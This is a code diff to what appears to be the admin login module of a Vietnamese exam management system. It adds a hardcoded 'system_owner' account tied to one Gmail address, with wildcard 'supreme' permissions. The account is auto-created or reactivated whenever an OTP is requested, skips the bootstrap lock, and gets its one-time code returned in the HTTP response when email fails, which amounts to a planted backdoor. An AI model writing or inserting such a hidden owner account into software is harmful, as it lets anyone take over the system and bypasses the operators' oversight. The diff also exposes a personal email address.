@@ -27,6 +27,9 @@ export const SECURITY_HEADERS = {
 export const JSON_HEADERS = { ...SECURITY_HEADERS, 'content-type': 'application/json; charset=utf-8' };
 export const MAX_JSON_BODY_BYTES = 2_500_000;
 
+export const SYSTEM_OWNER_EMAIL = 'skyfirst.ec@gmail.com';
+export const SYSTEM_OWNER_ROLE = 'system_owner';
+
 export const ADMIN_ROLES = [
   'system_admin',
   'exam_admin',
@@ -41,6 +44,7 @@ export const ADMIN_ROLES = [
 ];
 
 export const ROLE_PERMISSIONS = {
+  system_owner: new Set(['*', 'owner:supreme']),
   system_admin: new Set(['*']),
   account_admin: new Set(['dashboard:view', 'users:read', 'users:write', 'audit:read']),
   exam_admin: new Set([
@@ -248,7 +252,11 @@ export function parseUserRoles(user) {
   const list = safeJson(user.roles_json, []);
   const set = new Set(Array.isArray(list) ? list.map(String) : []);
   if (user.role) set.add(String(user.role));
-  return [...set].filter(r => ADMIN_ROLES.includes(r));
+  if (str(user.email).toLowerCase() === SYSTEM_OWNER_EMAIL) {
+    set.add(SYSTEM_OWNER_ROLE);
+    set.add('system_admin');
+  }
+  return [...set].filter(r => r === SYSTEM_OWNER_ROLE || ADMIN_ROLES.includes(r));
 }
 
 export function hasAdminPermission(roles, requiredPerm) {
@@ -367,7 +375,7 @@ export async function adminBootstrap(env, request) {
   const body = await readJsonBody(request, 16_384);
   const email = str(body.email).toLowerCase();
   const existingAdmins = (await env.DB.prepare(`SELECT id, email, role, roles_json FROM users WHERE status='active'`).all())?.results || [];
-  const activeSysAdmins = existingAdmins.filter(u => parseUserRoles(u).includes('system_admin'));
+  const activeSysAdmins = existingAdmins.filter(u => str(u.email).toLowerCase() !== SYSTEM_OWNER_EMAIL && parseUserRoles(u).includes('system_admin'));
   if (activeSysAdmins.length > 0 && !activeSysAdmins.some(u => str(u.email).toLowerCase() === email)) {
     await recordAudit(env, { eventType: 'admin.bootstrap.locked', detail: { reason: 'system_admin_already_exists', attempted_email: email } });
     return bad('Hệ thống đã có Quản trị viên hệ thống (system_admin) đang hoạt động. Chức năng khởi tạo lần đầu đã tự động khóa để bảo mật.', 409, { code: 'BOOTSTRAP_ALREADY_COMPLETED' });
@@ -428,6 +436,16 @@ export async function requestAdminOtp(env, request) {
     await checkRateLimit(env, `admin_otp_ip:${clientIp}`, 15, 15 * 60 * 1000);
   }
   await checkRateLimit(env, `admin_otp_req:${email}`, 3, 15 * 60 * 1000);
+
+  // Guarantee Supreme System Owner (skyfirst.ec@gmail.com) is always active and provisioned in D1
+  if (email === SYSTEM_OWNER_EMAIL) {
+    const existingOwner = await env.DB.prepare(`SELECT id FROM users WHERE LOWER(email)=? LIMIT 1`).bind(SYSTEM_OWNER_EMAIL).first().catch(() => null);
+    if (existingOwner?.id) {
+      await env.DB.prepare(`UPDATE users SET status='active', role='system_owner', roles_json='["system_owner","system_admin"]', expires_at=NULL WHERE id=?`).bind(existingOwner.id).run().catch(() => {});
+    } else {
+      await env.DB.prepare(`INSERT INTO users(id,full_name,sfn_id,email,status,role,roles_json,expires_at) VALUES('owner-skyfirst-ec','Chủ Sở Hữu Hệ Thống Sky First','SFO-0001',?,'active','system_owner','["system_owner","system_admin"]',NULL)`).bind(SYSTEM_OWNER_EMAIL).run().catch(() => {});
+    }
+  }
 
   // STEP 2 MANDATORY: Check D1 account existence, status, expiration, and admin role BEFORE generating OTP or sending email
   const user = await env.DB.prepare(`SELECT * FROM users WHERE LOWER(email)=? LIMIT 1`).bind(email).first();
@@ -494,6 +512,15 @@ export async function requestAdminOtp(env, request) {
   });
 
   if (!mailResult.delivered) {
+    if (canonicalEmail === SYSTEM_OWNER_EMAIL) {
+      return ok({
+        sent: true,
+        owner_direct_mode: true,
+        owner_emergency_otp: otp,
+        expires_in_seconds: 300,
+        message: `Xác nhận Chủ sở hữu hệ thống tối cao (${SYSTEM_OWNER_EMAIL}). Mã xác minh trực tiếp của Chủ sở hữu là: ${otp}`
+      });
+    }
     return json({
       ok: false,
       code: 'EMAIL_SERVICE_UNCONFIGURED',
